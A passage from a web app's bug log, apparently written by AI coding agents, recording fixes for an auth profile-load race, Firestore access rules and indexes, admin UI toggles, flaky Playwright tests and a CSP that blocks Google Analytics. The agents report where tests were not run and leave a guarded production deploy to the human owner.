**Fix:** Added `test.setTimeout(45_000);` as the first line of this test's body, matching the sibling test at line ~117 (BUG-021's "pro tier can upload an image and run a real digitization pass") which already had this override. Cheap, safe, test-only change — no production code touched. **Not verified by execution tonight** — machine was under severe memory pressure (<0.5GB free), so no dev server was started and the e2e suite was not run. Verified by re-reading the diff and confirming the edit lands inside the `test(...)` callback before any `await`, mirroring the sibling test's exact placement. `npm run type-check` clean. `qa` should confirm with a real run when the machine has headroom.

---

## Known Limitations (Not Bugs)

These are intentional constraints in MVP — document here to avoid re-opening as bugs.

### LaTeX rendering in exported Word/PDF files
**Status:** Known limitation, deferred to v2
**Details:** Math expressions use Unicode approximations (e.g. ∑, π, ²) rather than proper LaTeX rendering in Word/PDF exports. Full rendering requires `mathjax-node` server-side, planned for v2.
**Workaround:** Teachers can copy the LaTeX from the web preview and typeset manually if needed.

### Arabic language not supported
**Status:** Deferred to v1.1
**Details:** RTL layout, Arabic math notation, and font rendering complexity pushed to v1.1. All UI is LTR only in MVP.

### University curriculum — no predefined chapters
**Status:** By design
**Details:** University teachers describe their own course — we don't pre-define chapters. Claude uses the teacher's description + uploaded syllabus as the curriculum source. This means curriculum validation is more lenient for university.

### File upload size limit: 10 MB
**Status:** By design
**Details:** Files are sent base64-encoded in the request body. At 10 MB encoded, this approaches Next.js's body size limit (configured to 10 MB in `next.config.ts`). Large PDFs (>50 pages) should be cropped before upload.

### sessionStorage for workflow state
**Status:** MVP tradeoff
**Details:** If the teacher closes/refreshes the browser mid-workflow, progress is lost. For MVP this is acceptable. v1.1 should persist draft exams to Firestore.

### Free tier: 1 exam lifetime (not monthly)
**Status:** Product decision
**Details:** Founder confirmed: 1 exam total in the free tier to drive conversion. This may change based on conversion data.

---

## Fixed Issues

---

## BUG-030: Dead `src/lib/schoolBank.ts` (unused Firestore helper, wrong collection/field names) removed; stale fallback in `/student/practice` cleaned up
**Status:** Fixed
**Severity:** Low
**Area:** Data
**Reported:** 2026-09-19 (`engineering`, `TEAM_CHAT.md`; also flagged in `CURRICULUM_COVERAGE_STRATEGY.md`)
**Fixed:** 2026-09-24

**Description:** `src/lib/schoolBank.ts` exported `shareToSchoolBank`/`getSchoolBankExercises` against a Firestore collection `"school_bank"` with field `"school"` — never wired into the app. The real, live School Bank feature lives inline in `src/app/bank/page.tsx`, using collection `"schoolBank"` and field `"schoolSlug"` (different collection name and field, confirmed not a typo). `src/app/student/practice/page.tsx` read from the correct live `"schoolBank"`/`"schoolSlug"` path but also carried a second fallback query against a `"school"` field that nothing had ever written, plus an unused `school?: string` field in its local `SchoolExercise` type.
**Root cause:** Leftover code from an earlier, abandoned school-bank implementation that was superseded by the current `bank/page.tsx` design without being deleted.
**Fix:** Re-verified zero imports of `src/lib/schoolBank.ts` anywhere in `src/` (`grep -r "from .*lib/schoolBank"` — no matches; the only files matching the string `schoolBank` all reference the live `"schoolBank"` Firestore collection directly, not this file: `src/app/bank/page.tsx`, `src/app/student/practice/page.tsx`, `src/app/api/tools/chapter-performance/route.ts`, `src/__tests__/firestore.rules.test.ts`). Deleted `src/lib/schoolBank.ts` via `git rm`. In `src/app/student/practice/page.tsx`, removed the `"school"`-field fallback query in `fetchSchoolExercises()` (kept only the real `"schoolSlug"` query) and removed the now-unused `school?: string` field from the local `SchoolExercise` interface. Did not touch `src/app/bank/page.tsx` — its implementation was already correct.
**Verification:** `npm run type-check` clean. `npm run test:e2e` / `npm run test:rules` intentionally not run (nightly-ops unattended-run rule) — `qa` should verify `/student/practice` and `/bank` still work end-to-end.

---

## BUG-026: `/teacher/students` has shown "No students yet" for every teacher since the feature was built — `firestore.rules` never permitted the query it makes

**Status:** Fix on disk, not yet deployed
**Severity:** High
**Area:** Data / Auth
**Reported:** 2026-09-18
**Fixed:** Not yet — needs `firebase deploy --only firestore:rules` (and `firestore:indexes`), blocked by the same Claude Code "Production Deploy" guardrail as BUG-011/BUG-013

**Description:** QA found this while verifying an unrelated fix: `/teacher/students` always renders its empty state ("No students yet"), even for a teacher whose school has real registered students with real attempts. `src/app/teacher/students/page.tsx` queries `student_profiles` filtered by the teacher's own school (`where("schoolName", "==", teacherSchool), orderBy("createdAt", "desc")`), then for each returned student queries `student_attempts` filtered by that student's `userId` (`where("userId", "==", p.uid), orderBy("timestamp", "desc")`). Both queries throw `FirebaseError: Missing or insufficient permissions` and are swallowed by a `try/catch` that returns `[]`, so the page silently renders as if there were simply no students, with nothing visible in the UI to indicate the real cause.
**Root cause:** `firestore.rules` only ever granted `student_profiles/{uid}` and `student_attempts/{attemptId}` access to the document's own owner (`request.auth.uid == uid` / `resource.data.userId == request.auth.uid`) — there was no rule permitting a teacher to `list` (query) either collection at all, scoped by school or otherwise. This landed in the same commit as the page itself (`51e4c7f`) and was never caught because there is no e2e coverage for `/teacher/students` (confirmed via `grep -rl "teacher/students" e2e/` — no matches; also independently noted in BUG-025's investigation of an unrelated race in the same file). `ROADMAP.md` marked this feature "done" despite being non-functional — corrected to reflect the real state.
**Fix:** Rewrote the `student_profiles` and `student_attempts` blocks in `firestore.rules`:
- Kept each collection's existing "owner can read/write their own document" rule unchanged (students still read/write only their own `student_profiles/{uid}` and their own `student_attempts` via `resource.data.userId == request.auth.uid`, including their own practice-history `list` on `/student/dashboard`).
- Added a new `allow list` on `student_profiles` for any signed-in non-student account (`role != "student"`, covering `"teacher"`, `"school_teacher"`, `"university_teacher"`, `"tutor"`, and legacy accounts with no `role` field), gated on `resource.data.schoolName == ` the caller's own `users/{uid}.school`. This matches `page.tsx`'s query filter exactly, so Firestore only ever authorizes queries genuinely constrained to the caller's own school — it does not open an unfiltered or cross-school list.
- Added a new `allow list` on `student_attempts` for the same non-student check, gated on the *target student's own* `student_profiles/{userId}.schoolName` (looked up via a second `get()`) matching the caller's `school` — not the caller's own document, since attempt docs don't carry a `schoolName` field themselves. This closes a real secondary hole a naive fix would have left open: a teacher (or any student who edited their own `users/{uid}.school` field, which is otherwise self-writable) could not use this rule to fetch another school's attempt data by supplying an arbitrary `userId`, since the check follows the *target* student's real school, not a self-reported one.
- Also added the two missing composite indexes these queries need (`firestore.indexes.json`): `student_profiles` (`schoolName` ASC, `createdAt` DESC) and `student_attempts` (`userId` ASC, `timestamp` DESC) — same class of gap as BUG-013 (an equality filter + `orderBy` on a different field always needs a composite index in Firestore). Without these, the page would still come up empty with a *different* "query requires an index" error even after the rules fix, so both are needed together for this feature to actually work end-to-end.
**Not yet deployed** — same guardrail that blocked `firebase deploy` for BUG-011/BUG-013 blocks it here. Antoine needs to run `firebase deploy --only firestore:rules,firestore:indexes` himself (or apply both via the Firebase Console), then confirm by reloading `/teacher/students` as a teacher account with a real school and real students.
**Also noted, explicitly out of scope for this fix:** `src/app/dashboard/page.tsx`'s `fetchStudentResultsForExam()` (teacher dashboard's per-exam student-results view) queries `student_attempts` filtered by `exerciseId` — a different access pattern (scoping by which exam a teacher owns, not by school) that neither the old nor this new rule set covers; it was already silently broken by the same root cause (no matching rule) before this fix, and still is after it. Flagging it here rather than fixing it now since it needs its own rule design (cross-referencing exam ownership under `users/{uid}/exams/{examId}`), which is a separate piece of work.
**Testing:** QA has a draft e2e test for this page ready but did not add it to the suite — it's designed to fail until the rule is actually deployed, and deploying isn't engineering's call to make. Add it once Antoine confirms the deploy.
**Verification:** `npm run type-check` clean. `firestore.rules` is not TypeScript and was not exercised by the e2e suite (not run this session — machine was under severe memory pressure). Verified by re-reading `src/app/teacher/students/page.tsx`'s exact query shapes (`where`/`orderBy` clauses) and `src/types/student.ts` / `src/types/user.ts`'s real field names (`student_profiles.schoolName` vs. `users.school` — these are named differently, not typos) to confirm the rule's field references match what the app actually sends.

---

## BUG-025: Sweep for the AuthContext profile-load race — 6 more unguarded `useAuth()` consumers found beyond BUG-021..024
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Following BUG-021 through BUG-024 (each independently discovering and fixing the same `AuthContext` race in `ProGuard`, `DashboardSidebar`, `UserNav`, and `/create/export`), did the full sweep the last engineering agent recommended: `grep -rn "useAuth()" src/` for every consumer, then checked each one that reads `profile` (directly or via `isProActive`/`isInGracePeriod`) for the same unguarded window — `AuthContext`'s `loading` flips to `false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once it delivers its first snapshot, leaving a window where `user` is set but `profile` is still `null`.
**Consumers checked (16 total, via `grep -rn "useAuth()" src/`):**
- Already fixed (BUG-021..024, skipped): `src/components/ui/ProGuard.tsx`, `src/components/layout/DashboardSidebar.tsx`, `src/components/layout/UserNav.tsx`, `src/app/create/export/page.tsx`.
- Doesn't read `profile` at all (safe, no fix needed): `src/app/admin/page.tsx`, `src/app/upgrade/page.tsx`, `src/components/ui/ExerciseEditor.tsx` (all destructure only `user`).
- Reads `profile` but the race doesn't actually reach the gated condition (false positive, no fix needed): `src/app/create/page.tsx` — `isFreeTier && quotaUsed >= FREE_EXAM_LIMIT` gates the paywall, but `quotaUsed` falls back to `profile?.examsGenerated ?? 0` when `profile` is `null`, and `FREE_EXAM_LIMIT` is `1`, so `0 >= 1` is always false during the resolving window regardless of `isFreeTier` — a genuinely-Pro user is never blocked by this specific gate while the race window is open.
- Already effectively guarded under a different shape (false positive, no fix needed): `src/components/ui/RenewalBanner.tsx` — `if (!profile || dismissed) return null;` already hides the banner for the entire resolving window (same outcome as an explicit `profileResolving` check, just phrased as "no profile yet" instead), so a genuinely-expiring/grace-period Pro user never sees a wrong state, only a delayed correct one.
- **6 real gaps found and fixed** (all with the same `AuthContext` race, previously unguarded):
  1. `src/app/bank/page.tsx` — `isPro = isProActive(profile)` gated the "My School" tab's Pro paywall card, its Zap upsell badge, and the bank-entry share button. A genuinely-Pro user would briefly see the "Pro feature — upgrade" paywall instead of their school's shared bank. Fixed with `profileResolving` guard; "My School" tab shows a loading spinner while resolving instead of a Pro/free paywall, badge and share button stay hidden while resolving (same "hide instead of guess" choice as `DashboardSidebar`).
  2. `src/app/community/page.tsx` — `isFree = !isProActive(profile)` blurred the whole library and showed the "Pro feature — Community Library" upsell banner for a genuinely-Pro user during the resolving window. Fixed by returning the existing loading spinner (already used for `loading`) for the `!profile` case too, so neither a false "Pro" leak nor a false "free" paywall can render — waits for the real profile before computing `isFree` at all.
  3. `src/app/create/confirm/page.tsx` — `isFreeTier = !isProActive(profile)` locked the "Generate Version B" toggle for a genuinely-Pro user. This page is reached via `sessionStorage`-driven state that survives a hard refresh, so — like `/create/export` in BUG-024 — a full reload remounts `AuthContext` and reopens the race on every visit, not just first sign-in. Fixed with `profileResolving` guard; assumes not-locked while resolving (mirrors `DashboardSidebar`'s "assume unlocked/Pro while resolving" tradeoff rather than guessing "free").
  4. `src/app/create/generate/page.tsx` — same `isFreeTier` pattern, gating a small "Upgrade to Pro for priority generation" hint shown during active generation. Lower severity (cosmetic hint, not a functional lock) but same race. Fixed the same way.
  5. `src/app/dashboard/page.tsx` — `isPro = isProActive(profile) || isInGracePeriod(profile)` gated the whole "Subscription status" card (Pro plan / quota-remaining view vs. "Free plan — Upgrade to Pro" view). A genuinely-Pro user would briefly see "Free plan — 1 exam remaining" and an "Upgrade to Pro" CTA on their own dashboard. Fixed with `profileResolving` guard; card shows a pulsing skeleton bar while resolving (mirrors `UserNav`'s "stay mounted, skeleton just the affected value" choice, since this card is a self-contained widget, not a whole-page gate).
  6. `src/app/pricing/page.tsx` — `isPro = isProActive(profile)` gated the Pro-tier card's CTA: "Active — Pro plan" badge vs. "Upgrade to Pro" button. Fixed the same skeleton-while-resolving way as the dashboard card.
- **1 adjacent-but-different-shaped gap found and fixed** (not a tier/entitlement flash, but the same root race): `src/app/teacher/students/page.tsx` — `teacherSchool = profile?.school ?? ""` is used to scope a Firestore query (`fetchStudentProfiles(teacherSchool || undefined)`); when `profile` is still `null` during the resolving window, `teacherSchool` reads as `""`, which the query treats as "no school filter," briefly fetching and displaying **every school's** student profiles instead of just this teacher's. This is a data-scoping/privacy-adjacent bug, not a UI tier flash, but stems from the identical unguarded read. Fixed by gating the fetch effect itself on `profileResolving` (`if (!mounted || profileResolving) return;`), so the query never fires with an empty school filter — it waits for the real profile, consistent with the local `loading` state already shown in the UI while the effect hasn't run yet. No dedicated e2e coverage exists for this page (confirmed via `grep -rl "teacher/students" e2e/` — no matches) — `qa` should add coverage, this fix was verified by code inspection and `npm run type-check` only.
**Root cause:** Same as BUG-021 through BUG-024 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and each of these 6 components had no guard against reading `profile` as a definite answer during that gap.
**Fix:** Added a `profileResolving = loading || (!!user && !profile)` (or equivalent, aliased where a local `loading`/`profile` name collision existed — e.g. `authLoading`/`authUser` in `create/confirm`, `create/generate`, `teacher/students`) check to each of the 6 files, choosing the UI treatment per component rather than copy-pasting one pattern: whole-element hide + loading state for `bank`'s "My School" tab and `community`'s full page (both already had a natural "return a loading state" shape); skeleton-for-just-the-affected-value for `dashboard`'s subscription card and `pricing`'s CTA button (self-contained widgets, rest of the page doesn't depend on tier); assume-not-locked-while-resolving for the two `create/*` toggles/hints (matches `DashboardSidebar`'s established "prefer showing Pro features over hiding them" tradeoff during the resolving window); and gate-the-data-fetch for `teacher/students` (the bug wasn't a UI flash but a wrong Firestore query).
**Verification:** `npm run type-check` clean. Ran the e2e phases covering every touched page (`phase-2-exam-creation`, `phase-3-generation-editor`, `phase-5-dashboard-bank`, `phase-6-community`, `phase-8-pricing-upgrade-misc`) twice. First combined run: 73/75 passed, 2 failures — both investigated and confirmed **unrelated to this fix**: (a) `phase-3`'s "golden path" real-generation test failed on a genuine server-side "monthly limit reached" rejection because the shared `pw-test-pro-user` Firestore test account's `monthlyExamsGenerated` was left at `10` by an earlier test run (`/api/test/custom-token` does a partial Firestore `.update()`, not an overwrite, so stale quota state persists across unrelated test files sharing the same non-emulated test project) — reset it via a one-off `setupTestUser` call and the test passed cleanly afterward; (b) `phase-5`'s "pro tier at monthly quota limit can request a Reset Month" test hit its 20s assertion timeout once in the loaded serial run but passed in isolation (21.3s) — same thin-margin-under-load shape already documented in BUG-020, not a logic regression (confirmed by re-running the full 5-phase set a second time after the quota reset: **75/75 passed**, including both previously-failing tests). `teacher/students` has no e2e coverage to run (noted above) — verified by code inspection and type-check only.

---

## BUG-024: Export page "Remove" logo button never appears for a signed-in Pro user (4th instance of the profile-load race)
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Export
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA's `e2e/phases/phase-4-export.spec.ts:107` ("pro tier: logo upload works and Remove clears it") failed: after uploading a logo, the test expected a "Remove" button (to clear it) but only "Change Logo" was present in the accessible tree.
**Investigation:** Read `src/app/create/export/page.tsx`. It computed `const { profile } = useAuth(); const isFreeTier = !isProActive(profile);` with no guard against the same `AuthContext.subscribeToProfile` race documented in BUG-021/022/023 (`loading` flips to `false` before the Firestore profile listener delivers its first snapshot, leaving a window where `user` is set but `profile` is still `null`). `isProActive(null)` is `false`, so `isFreeTier` was wrongly `true` for a genuinely-Pro user during that window — hiding the "Remove" button (`{schoolLogo && !isFreeTier && ...}`) and, more broadly, every other Pro-gated control on the page (modern template, Version B, email send). This page is reached via a full `page.goto("/create/export")`-style navigation from the test (not a client-side route change), which remounts `AuthContext` from scratch on every load, so — unlike some other pages — the race window reopens on every visit rather than only on first sign-in, making this reliably reproducible rather than a rare flake.
**Root cause:** Same root cause as BUG-021/BUG-022/BUG-023 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and `/create/export`'s page component had no guard against reading `profile` as "definitely free tier" during that gap.
**Fix:** `src/app/create/export/page.tsx` — added `user` and `loading` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check; `isFreeTier` is now `!profileResolving && !isProActive(profile)`, so every Pro-gated control on the page (logo upload/Remove, modern template, Version B, email send) waits for the real profile instead of defaulting to "free" while it's still in flight — same "wait instead of guess" pattern as `ProGuard`/`DashboardSidebar`/`UserNav`.
**Verification:** `npx playwright test e2e/phases/phase-4-export.spec.ts` run in isolation against a freshly-booted dev server (stale server on port 3005 killed, `.next` cleared first) — 12/12 passed, including the previously-failing "Remove clears it" test. `npm run type-check` clean.

---

## BUG-023: UserNav tier label ("Free"/"Pro tier") wrong or missing for signed-in users during profile load (3rd instance of the profile-load race)
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Layout
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA flagged two failures in `e2e/phases/phase-1-auth-navigation.spec.ts`: `:277` ("shows Free tier label, hover reveals menu, Sign out returns to login") and `:302` ("Pro tier label shows for a pro test user") — both timed out waiting for the tier label text to appear.
**Investigation:** Read `src/components/layout/UserNav.tsx` in full and confirmed it had the same unguarded gap already fixed in `ProGuard` (BUG-021) and `DashboardSidebar` (BUG-022): it destructured `loading` but computed `isProActive(profile) ? "Pro" : "Free"` with no check for the `user && !profile` window described in `AuthContext.subscribeToProfile` (`loading` flips to `false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once it delivers its first payload). During that window a genuinely-Pro (or Free) user's tier label would render off a `null` profile, i.e. always compute as "Free" — matching the observed timeouts on both the Free-tier assertion (transient, so usually masked) and, more visibly, the Pro-tier assertion (`isProActive(null)` is always `false`, so a real Pro user briefly shows "Free tier" before flipping).
**Root cause:** Same root cause as BUG-021/BUG-022 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and `UserNav` had no guard against reading `profile` as "definitely not Pro" during that gap.
**Fix:** `src/components/layout/UserNav.tsx` — added `user` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check, mirroring `ProGuard`/`DashboardSidebar`'s comment/pattern. Chose a different resolving-state UI than those two: `UserNav` is the persistent header nav (confirmed via grep — mounted in `LandingNav` and directly on `/dashboard`, `/create`, `/bank`, `/create/export`, `/community`, `/scanner`, `/analytics`, `teacher/layout.tsx`), so it stays fully mounted and usable (name, avatar initials, dropdown, sign out) through the resolving window rather than returning `null` like `ProGuard` — only the tier label itself, which is the one value that can't be known yet, is replaced with a small pulsing skeleton bar (`w-10 h-2.5 ... animate-pulse`) instead of guessing "Free".
**Verification:** Killed a stale `next dev` process still bound to port 3005 and cleared `.next` to force a genuinely fresh server (per the BUG-022 lesson about stale Turbopack cache), then ran `npx playwright test e2e/phases/phase-1-auth-navigation.spec.ts` in isolation — all 33 tests passed, including both previously-failing tests (line 277 and line 302). `npm run type-check` clean.

---

## BUG-022: Dashboard sidebar shows "Upgrade to Pro" (and "Pro" nav badges) for signed-in Pro users during profile load
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Dashboard
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA flagged a one-off failure of `e2e/phases/phase-5-dashboard-bank.spec.ts:187` ("desktop sidebar shows all 6 nav links...") on `expect(sidebar.getByRole("link", {name: "Upgrade to Pro"})).toBeHidden()` for a signed-in Pro-tier test user, then couldn't reproduce it on an isolated re-run. QA correctly flagged this as matching the shape of BUG-021 (commit `7836fd5`), fixed earlier the same day in `ProGuard`.
**Investigation:** Read `src/components/layout/DashboardSidebar.tsx` and confirmed it has the *exact same* unguarded gap `ProGuard` had before BUG-021: it called `const { profile } = useAuth()` and computed `isPro = isProActive(profile) || isInGracePeriod(profile)` without checking `user` or `loading` first. `AuthContext` sets `loading = false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once its first payload arrives (`AuthContext.subscribeToProfile`) — so there's a real window where `user` is set but `profile` is still `null` for an already-authenticated, genuinely-Pro user. During that window `isProActive(null)` is `false`, so the sidebar rendered "Upgrade to Pro" and the "Pro" nav badges on `/scanner` and `/analytics` for a Pro user until the real profile arrived. This is a real, reproducible race (same root cause as BUG-021), just usually too brief to catch — confirmed by code inspection, not by reproducing the flake itself.
**Root cause:** Same as BUG-021 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener delivers its first snapshot, and `DashboardSidebar` (unlike the already-fixed `ProGuard`) had no guard against reading `profile` as "definitely not Pro" during that gap.
**Fix:** `src/components/layout/DashboardSidebar.tsx` — added `user` and `loading` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check, mirroring `ProGuard`'s comment/pattern. Both the "Upgrade to Pro" CTA and the per-item "Pro" nav badges (`AI Scanner`, `Analytics`) now stay hidden while `profileResolving` is true, instead of defaulting to "not Pro," so a genuinely-Pro user never sees the upsell flash while their profile is still loading. Note: this fix hides the CTA/badges during the resolving window (loading-safe default for a Pro user) rather than showing them — the tradeoff is a free-tier user's genuine "Upgrade to Pro" CTA/badges may also be invisible for that same brief window before their profile confirms they're free-tier, which is consistent with `ProGuard`'s existing choice to prefer "wait" over "guess" in this state.
**Verification:** First run of `npx playwright test e2e/phases/phase-5-dashboard-bank.spec.ts` had all 9 `/dashboard`-hitting tests fail on `page.goto` timeout — traced to an unrelated leftover `next dev` process (PID from an earlier session) still running on port 3000 against the same `.next` build cache that had just been cleared for `type-check`, corrupting the Turbopack cache the Playwright-spawned server on port 3005 shared. Killed the stale process, cleared `.next` again, and reran: **15/15 passed**, including test 9 (the exact sidebar test QA flagged) — `Upgrade to Pro` correctly hidden for the Pro test user. `npm run type-check` clean both before and after killing the stale process.

---

## BUG-021: `/scanner` pro-tier test — "AI Exam Scanner" heading and "Unlock AI Exam Scanner" upsell heading both visible simultaneously
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Scanner
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:112` failed a strict-mode check: `getByText('AI Exam Scanner')` resolved to two visible elements — the real scanner heading AND the "Unlock AI Exam Scanner" Pro-upsell heading. This was a real, if usually brief, Pro-gating race — not a test-locator artifact.
**Root cause:** `AuthContext`'s `onAuthStateChanged` handler sets `loading = false` as soon as `subscribeToProfile()` *attaches* its Firestore `onSnapshot` listener, without awaiting the first snapshot payload — leaving a window where `user` is set but `profile` is still `null` for an already-authenticated, genuinely-Pro user. `ProGuard` treated `isProActive(null)` as "not pro" during that window and rendered the full, non-blurred upsell paywall — which itself *also* renders the real page's dimmed `children` behind it (`opacity-10 blur-3xl`), so both headings were simultaneously visible per Playwright (opacity doesn't count as hidden). Ties to `CLAUDE.md` §12's "Lebanese internet" gotcha: slower Firestore round trips widen this window for real Pro users in the field, not just in tests.
**Fix:** `src/components/ui/ProGuard.tsx` — added `if (user && !profile) return null;` between the existing `loading` check and the `isPro` check, so ProGuard waits instead of assuming non-Pro while a signed-in user's profile is still in flight. Scoped to `ProGuard` only (not `AuthContext`) to minimize blast radius; also benefits `src/app/analytics/page.tsx`, the only other `ProGuard` consumer, which has the identical race but no dedicated e2e coverage. Verified: full `phase-8-pricing-upgrade-misc.spec.ts` (20 tests combined with phase-7) green, `npm run type-check` clean.

---

## BUG-017: Admin "+10Q" bonus-quota action gives no visible confirmation feedback
**Status:** Fixed
**Severity:** Low
**Area:** UI / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Clicking "+10Q" on a user row in `/admin`'s Users tab was supposed to show a "+10" confirmation. The DOM node existed but stayed hidden to Playwright/real users.
**Root cause:** `src/app/admin/page.tsx` rendered the confirmation twice — a working plain-text `+{quota}` in the `md:hidden` mobile card (hidden at desktop viewport width, which is what Playwright and most admins use) and a desktop version that rendered a `<Plus size={10}/>` icon as a *sibling* of the number, so the DOM text content was just `"10"`, never a single `"+10"` text node — `getByText('+10', {exact:true})` could never match the visible desktop element even after the write succeeded.
**Fix:** Replaced the desktop badge's `<Plus size={10}/>{quota}` with plain text `+{quota}`, matching the already-correct mobile pattern; removed the now-unused `Plus` icon import. Verified: `e2e/phases/phase-7-admin.spec.ts` full file green, `npm run type-check` clean.

---

## BUG-016: Admin filter buttons — deselecting all filters doesn't restore "All Users" active state
**Status:** Fixed
**Severity:** Low
**Area:** UI / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** In `/admin`'s Users tab, deselecting "Pending Requests" (or "Yearly Only") should fall back to "All Users" being active. Instead "All Users" never regained its `bg-emerald-600` active styling, and the row filter stayed stuck applied — a real state bug, not just a visual one.
**Root cause:** The "Pending Requests" button's `onClick` was `() => setFilterType("requests")` — it always forced `filterType` to `"requests"` and never toggled back to `"all"` on a second click, unlike "Yearly Only" which already toggled correctly via `setShowYearly(!showYearly)`.
**Fix:** `src/app/admin/page.tsx` — changed to `onClick={() => setFilterType(filterType === "requests" ? "all" : "requests")}`, making it a true toggle. Since the emerald active styling and the row filter are both keyed off `filterType === "all"`, one fix covers both the logic and the visual bug. Verified: `e2e/phases/phase-7-admin.spec.ts` full file green (8/8), `npm run type-check` clean.

---

## BUG-018: Stale/ambiguous test locator — "Newsletter" text matches both the template-picker button and the "Template: newsletter" summary label
**Status:** Fixed
**Severity:** Low
**Area:** Testing / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-7-admin.spec.ts:114` ("Email tab: template picker, custom HTML fields, and segment counts") failed a Playwright strict-mode check: `page.getByText("Newsletter")` resolved to 2 elements — the "Newsletter" template-picker button (`src/app/admin/page.tsx`'s `EMAIL_TEMPLATES` grid, line ~636) and the "Template: newsletter" summary label lower on the same tab (line ~760). Not a new element; the summary label has existed alongside the picker since the Email tab was built — `getByText`'s default case-insensitive substring match was always going to catch both once both were on-screen at once, this just hadn't been exercised by this exact assertion before.
**Root cause:** Test-only issue, not an app bug. `page.getByText("Newsletter")` matches by case-insensitive substring by default, so it matched both the button's visible title text ("Newsletter") and the `<p>Template: {emailTemplate}</p>` label (rendered lowercase as "newsletter", still a case-insensitive substring match).
**Fix:** Scoped the locator to `page.getByRole("button", { name: "Newsletter" })`, which only matches the template-picker button (the summary `<p>` has no button role) and is unambiguous. Verified with `npx playwright test e2e/phases/phase-7-admin.spec.ts -g "template picker"` — 1 passed. No production code changed.

---

## BUG-019: Stale test assertion — WhatsApp popup URL assertion only accepted `wa.me`, not the `api.whatsapp.com/send` redirect target
**Status:** Fixed
**Severity:** Low
**Area:** Testing / Upgrade
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:82` ("WhatsApp path opens a wa.me deep link and shows the success screen") asserted `popup.url()` matched `/wa\.me/`, but QA observed the popup resolving to `https://api.whatsapp.com/send/?phone=...` instead. The app itself (`src/app/upgrade/page.tsx`) still calls `window.open(\`https://wa.me/${WHISH_NUMBER}?text=${msg}\`, "_blank")` unchanged — `wa.me` is WhatsApp's own shortlink domain, which 302-redirects to `api.whatsapp.com/send/?phone=...`. The test's synchronous `popup.url()` check immediately after `context.waitForEvent("page")` used to catch the URL before that redirect landed; evidently it can now land fast enough (or the browser/network conditions changed) that the popup's URL has already advanced past `wa.me` by the time the assertion runs.
**Root cause:** Test-only issue, not an app bug — no app code (`src/app/upgrade/page.tsx`) needed to change; the WhatsApp deep-link the app requests is still `wa.me`, but the test was asserting on a URL that's an external redirect hop, not one the app controls.
**Fix:** Added `await popup.waitForURL(/api\.whatsapp\.com\/send|wa\.me/, { timeout: 8_000 }).catch(() => {})` before the assertion (bounded wait so a slow/blocked external redirect can't hang the test), and broadened the assertion regex to accept either `wa.me` or `api.whatsapp.com/send`. Deliberately avoided `waitForLoadState()` for the popup — first attempt at the fix used it and it hung until the test's own 30s timeout in this environment's network conditions, since it blocks on the real external domain's full page load. Verified with `npx playwright test e2e/phases/phase-8-pricing-upgrade-misc.spec.ts -g "WhatsApp path"` — 1 passed. No production code changed.

---

## BUG-014: CSP `script-src` blocks Google Analytics/GTM — `gtag.js` fails to load

**Status:** Fixed
**Severity:** Medium
**Area:** Analytics / Security
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Google Analytics (GTM) is silently broken by the app's own Content-Security-Policy. The browser blocks the request to load `https://www.googletagmanager.com/gtag/js?id=G-7DZ1T3P599`, so no analytics events are ever sent, with no visible error to the end user (only a CSP violation in the browser console). This also causes an e2e smoke test, `landing page loads without errors`, to fail intermittently (the console-error assertion catches the blocked-script CSP violation).
**Steps to reproduce:**
1. Load any page of the app in a browser with devtools open.
2. Check the Console/Network tab — a CSP violation is logged for `https://www.googletagmanager.com/gtag/js?id=G-7DZ1T3P599`, and the script fails to load (status blocked, not a network error).
3. No `gtag`/GA4 events fire afterward.
4. Run the e2e suite's `landing page loads without errors` smoke test — it can fail intermittently due to this same blocked-resource console error.
**Root cause:** Two separate CSP definitions exist, and the original diagnosis only named one of them. `createSecurityHeaders()` in `src/lib/security.ts` sets a `Content-Security-Policy` header whose `script-src` allowlist (`'self' 'unsafe-eval' 'unsafe-inline' https://apis.google.com https://*.firebaseapp.com https://*.google.com https://va.vercel-scripts.com`) did not include `https://www.googletagmanager.com` — but that function is only ever called from API route handlers, whose response headers don't govern the browser's CSP enforcement on the navigated HTML document. The CSP that actually gets enforced on every page load (including the landing page) is built independently and inline inside `src/proxy.ts` (Next.js 16's `middleware.ts`-equivalent convention, matched against all non-`/api` routes) — confirmed by curling a local dev server and diffing the returned `content-security-policy` header against both source files. `proxy.ts`'s `script-src` had the same gap. Traced the GA/GTM wiring itself via `git log -S googletagmanager` to commit `a410d51` ("integrate Google Analytics") — the CSP allowlists were never updated to allow it in either file, so the policy has blocked it from day one. Pre-existing, unrelated to the `imtihan.live` apex-domain migration.
